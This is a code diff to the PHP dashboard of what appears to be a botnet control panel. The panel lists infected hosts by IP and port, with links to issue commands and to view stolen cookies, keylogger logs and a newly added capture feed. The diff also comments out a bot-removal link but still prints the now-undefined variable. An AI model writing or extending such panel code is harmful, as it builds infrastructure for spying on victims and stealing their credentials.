@@ -243,7 +243,7 @@ echo '
 			  <th class="content_table-th">Capture</th>
 			  <th class="content_table-th">Cookies</th>
 			  <th class="content_table-th">Keylogger</th>
-              <th class="content_table-th">Hidden</th>
+        
             </tr>';
 
 // <tr class="content_table-tr">
@@ -258,14 +258,15 @@ echo '
 while ($stmt->fetch()) {
 	echo '<tr class="content_table-tr">';
 	$administer = $status == 1 ? "<a style='color:#00ff00;text-decoration:underline;' href='../php/openBot.php?ID=" . $ID . "'>administrator</a>" : "";
-	$delete = "<a style='color:#00ff00;text-decoration:underline;' href='../php/handleRemoveBot.php?ID=" . $ID . "'>hidden</a>";
+	// $delete = "<a style='color:#00ff00;text-decoration:underline;' href='../php/handleRemoveBot.php?ID=" . $ID . "'>hidden</a>";
 	$status_display = $status == 1 ? 'active' : 'non-active';
 	$cmd ="<a style='color:#00ff00;text-decoration:underline;' href='../php/viewCmd.php?ID=" . $ID . "'>view</a>";
 	$cookies = "<a style='color:#00ff00;text-decoration:underline;' href='../php/viewCookies.php?ID=" . $ID . "'>view</a>";
 	$keylogger = "<a style='color:#00ff00;text-decoration:underline;' href='../php/viewKeylogger.php?ID=" . $ID . "'>view</a>";
+	$capture = "<a style='color:#00ff00;text-decoration:underline;' href='../php/viewCapture.php?ID=" . $ID . "'>view</a>";
 	
 	
-	echo '<td class="content_table-td">' . $ID . '</td> <td class="content_table-td">' . $ip . '</td> <td class="content_table-td">' . $port . '</td> <td class="content_table-td">' . $administer . '</td> <td class="content_table-td">' . $status_display  . '</td><td class="content_table-td"> '.$cmd.'</td><td class="content_table-td"> view</td><td class="content_table-td"> '.$cookies. '</td><td class="content_table-td"> ' . $keylogger . '</td><td class="content_table-td">' . $delete . '</td>';
+	echo '<td class="content_table-td">' . $ID . '</td> <td class="content_table-td">' . $ip . '</td> <td class="content_table-td">' . $port . '</td> <td class="content_table-td">' . $administer . '</td> <td class="content_table-td">' . $status_display  . '</td><td class="content_table-td"> '.$cmd.'</td><td class="content_table-td"> ' .$capture.'</td><td class="content_table-td"> '.$cookies. '</td><td class="content_table-td"> ' . $keylogger . '</td><td class="content_table-td">' . $delete . '</td>';
 	echo '</tr>';
 }
 echo '	
